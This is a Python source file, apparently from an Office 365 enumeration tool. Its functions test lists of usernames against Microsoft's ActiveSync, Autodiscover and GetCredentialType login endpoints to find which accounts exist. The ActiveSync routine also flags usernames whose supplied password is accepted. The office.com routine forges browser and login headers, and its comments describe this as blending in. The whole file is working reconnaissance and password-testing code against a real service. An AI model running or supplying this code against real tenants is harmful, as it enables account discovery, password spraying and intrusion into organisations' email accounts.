import random
import re
import string
import argparse
import logging
import requests

try:
    import http.client as http_client
except ImportError:
    import httplib as http_client
    
def load_usernames(usernames_file):
    '''
    Loads a list of usernames from `usernames_file`.

    Args:
        usernames_file(str): filename of file holding usernames

    Returns:
        usernames(list): a list of usernames
    '''
    with open(usernames_file) as file_handle:
        return [line.strip() for line in file_handle.readlines()]
    

def o365enum_activesync(usernames):
    '''
    Check if `usernames` exists using ActiveSync.

    Args:
        usernames(list): list of usernames to enumerate
    '''
    headers = {
        "MS-ASProtocolVersion": "14.0",
        "User-Agent": "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro"
    }
    for username in usernames:
        state = 0
        for _ in range(0, args.num):
            response = requests.options(
                "https://outlook.office365.com/Microsoft-Server-ActiveSync",
                headers=headers,
                auth=(username, args.password)
            )

            if response.status_code == 200:
                state = 2
                break
            else:
                if 'X-MailboxGuid' in response.headers:
                    state = 1
                    break
        print("{},{}".format(username, state))

def o365enum_autodiscover(usernames):
    '''
    Check if `usernames` exists using Autodiscover v1.

    Args:
        usernames(list): list of usernames to enumerate
    '''
    headers = {
        "MS-ASProtocolVersion": "14.0",
        "User-Agent": "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro"
    }
    for username in usernames:
        state = 0
        for _ in range(0, args.num):
            response = requests.get(
                "https://outlook.office365.com/autodiscover/autodiscover.json"\
                    "/v1.0/{}?Protocol=Autodiscoverv1".format(username),
                headers=headers,
                allow_redirects=False
            )
            if response.status_code == 200:
                state = 1
                break
            elif response.status_code == 302 and \
                'outlook.office365.com' not in response.headers['Location']:
                state = 1
                break
        print("{},{}".format(username, state))

def o365enum_office(usernames):
    '''
    Checks if `usernames` exists using office.com method.

    Args:
        usernames(list): list of usernames to enumerate
    '''
    headers = {
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"\
            " (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
    }
    # first we open office.com main page
    session = requests.session()
    response = session.get(
        "https://www.office.com",
        headers=headers
    )
    # we get the application identifier and session identifier
    client_id = re.findall(b'"appId":"([^"]*)"', response.content)
    # then we request the /login page which will redirect us to the authorize
    # flow
    response = session.get(
        "https://www.office.com/login?es=Click&ru=/&msafed=0",
        headers=headers,
        allow_redirects=True
    )
    hpgid = re.findall(b'hpgid":([0-9]+),', response.content)
    hpgact = re.findall(b'hpgact":([0-9]+),', response.content)

    if not client_id or not hpgid or not hpgact:
        raise Exception("An error occured when generating headers.")

    # we setup the right headers to blend in
    headers['client-request-id'] = client_id[0]
    headers['Referer'] = response.url
    headers['hpgrequestid'] = response.headers['x-ms-request-id']
    headers['canary'] = ''.join(
        random.choice(
            string.ascii_uppercase + string.ascii_lowercase + string.digits + "-_"
        ) for i in range(248)
    )
    headers['hpgid'] = hpgid[0]
    headers['Accept'] = "application/json"
    headers['hpgact'] = hpgact[0]
    headers['Origin'] = "https://login.microsoftonline.com"

    # we setup the base JSON object to submit
    payload = {
        "isOtherIdpSupported":True,
        "checkPhones":False,
        "isRemoteNGCSupported":True,
        "isCookieBannerShown":False,
        "isFidoSupported":False,
        "originalRequest": re.findall(b'"sCtx":"([^"]*)"', response.content)[0].decode('utf-8'),
        "forceotclogin":False,
        "isExternalFederationDisallowed":False,
        "isRemoteConnectSupported":False,
        "federationFlags":0,
        "isSignup":False,
        "isAccessPassSupported":True
    }

    for username in usernames:
        payload["username"] = username
        response = session.post(
            "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US",
            headers=headers,
            json=payload
        )
        if response.status_code == 200:
            exists = not int(response.json()['IfExistsResult'])
        else:
            exists = -1
        print("{},{}".format(username, int(exists)))
